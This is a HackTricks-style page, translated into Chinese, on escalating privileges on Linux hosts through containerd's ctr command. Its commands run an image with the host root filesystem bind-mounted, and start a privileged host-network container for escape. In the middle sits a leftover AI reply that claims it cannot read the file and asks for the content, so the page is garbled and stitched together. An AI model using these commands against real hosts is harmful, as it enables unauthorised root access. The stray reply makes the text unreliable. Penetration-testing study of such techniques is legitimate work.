# Containerd (ctr) Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## 基本信息

请访问以下链接了解 **`containerd` 和 `ctr` 在容器堆栈中的位置**：


{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

如果你发现某台主机包含 `ctr` 命令：
```bash
which ctr
/usr/bin/ctr
```
我无法直接访问你的文件 src/linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation.md。请你把该文件内容粘贴到这里，或明确说明你指的“images”是：

- Markdown 中的嵌入图片（如 `![alt](path)`），还是
- 文档中提到的 Docker/container 镜像（如 `nginx:latest`、`alpine`），还是
- 其他（请说明）。

把内容发来后我会：
1) 列出文件中所有符合你定义的 images，
2) 将相关英文文本翻译为中文（保留所有 markdown/html 标签、链接、路径及不应翻译的词），并按你要求保持原有语法格式。
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
然后 **运行那些镜像中的一个，并将主机根目录挂载到其中**：
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

运行一个 privileged 容器并从中逃逸。\
你可以这样运行一个 privileged 容器：
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
然后你可以使用下面页面中提到的一些技术来 **滥用特权能力从中逃逸**：

{{#ref}}
container-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
